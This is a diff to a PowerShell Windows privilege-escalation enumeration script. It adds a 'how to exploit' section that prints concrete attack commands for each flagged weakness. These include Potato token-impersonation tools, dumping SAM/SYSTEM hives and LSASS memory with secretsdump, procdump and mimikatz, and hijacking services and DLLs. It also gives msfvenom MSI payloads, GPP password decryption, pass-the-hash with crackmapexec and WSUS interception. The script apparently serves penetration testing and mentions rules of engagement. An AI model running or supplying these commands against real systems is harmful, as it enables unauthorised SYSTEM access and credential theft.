@@ -390,6 +390,55 @@ Get-CimInstance Win32_Process | ForEach-Object {
 Sec "Environment variables"
 Get-ChildItem Env: | ForEach-Object { Info ($_.Name + "=" + $_.Value) }
 
+# ============================================================ how to exploit
+# Reference for the [!] findings above: if the script flagged a vector, here is
+# the concrete escalation path. Read-only guidance - nothing is run for you.
+Sec "How to exploit (reference for the [!] findings above)"
+function Xploit($h, $lines){ Emit ("  [*] " + $h); foreach($l in $lines){ Emit ("      " + $l) } }
+Xploit "SeImpersonate / SeAssignPrimaryToken -> SYSTEM (Potato)" @(
+  'GodPotato -cmd "cmd /c whoami"      (DCOM/RPC; most reliable on patched Win10/11)',
+  'PrintSpoofer64.exe -i -c cmd        (spooler named pipe)',
+  'SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a whoami   (MS-EFSR)')
+Xploit "SeBackupPrivilege" @(
+  'reg save hklm\sam sam & reg save hklm\system system',
+  'impacket-secretsdump -sam sam -system system LOCAL   (crack or pass-the-hash)',
+  'on a DC: use diskshadow/VSS to copy NTDS.dit, then secretsdump')
+Xploit "SeRestore / SeTakeOwnership" @(
+  'takeown /f <system-file> && icacls <file> /grant %USERNAME%:F -> replace a SYSTEM binary/service',
+  'or write to an auto-run/service path you now control')
+Xploit "SeLoadDriver / SeDebug" @(
+  'SeLoadDriver: load a known-vulnerable signed driver (BYOVD) -> kernel exec',
+  'SeDebug: procdump -ma lsass.exe out.dmp -> mimikatz sekurlsa::minidump for creds')
+Xploit "Unquoted service path" @(
+  'place payload at the first space-truncated path, e.g. C:\Program.exe for "C:\Program Files\..."',
+  'sc stop <svc> & sc start <svc>   (or wait for a reboot)')
+Xploit "Writable service binary / registry key" @(
+  'copy your exe over the ImagePath binary, or:',
+  'reg add HKLM\SYSTEM\CurrentControlSet\Services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\payload.exe /f',
+  'then restart the service (or reboot)')
+Xploit "AlwaysInstallElevated" @(
+  'msfvenom -p windows/x64/exec CMD="..." -f msi -o evil.msi',
+  'msiexec /quiet /qn /i C:\path\evil.msi     (runs as SYSTEM)')
+Xploit "Writable autorun / scheduled-task binary" @(
+  'replace the referenced binary with your payload and wait for the run/logon trigger')
+Xploit "GPP cpassword" @(
+  'gpp-decrypt <cpassword>   (AES key is public) -> plaintext domain creds',
+  'use them with runas /netonly, psexec, or crackmapexec')
+Xploit "Registry autologon / stored creds (cmdkey, vault, browser, KeePass)" @(
+  'use plaintext DefaultUserName/DefaultPassword directly',
+  'cmdkey creds: runas /savecred; browser/DPAPI: decrypt on-host; KeePass: crack the .kdbx offline')
+Xploit "SAM/SYSTEM hive backup" @(
+  'impacket-secretsdump -sam SAM -system SYSTEM LOCAL -> local hashes -> crack or pass-the-hash')
+Xploit "WSUS over HTTP" @(
+  'MITM the WSUS traffic and inject a signed built-in binary as an "update" (WSUSpect / PyWSUS) -> SYSTEM')
+Xploit "LocalAccountTokenFilterPolicy=1" @(
+  'the local admin hash works remotely:  crackmapexec smb <ip> -u admin -H <nthash> -x whoami')
+Xploit "Writable PATH / Program Files dir (DLL hijack)" @(
+  'drop a malicious DLL named after one the privileged app loads (check its imports / ProcMon) -> code exec')
+Xploit "WDigest UseLogonCredential=1" @(
+  'wait for/ trigger a privileged interactive logon, then dump LSASS for cleartext creds')
+Emit "  Match each item to the [!] lines above. Operate only within your rules of engagement."
+
 Emit ""
 Emit "Done. Review every [!] line. Nothing was changed on this host."
 if($OutFile){ Emit ("Full report written to: " + $OutFile) }
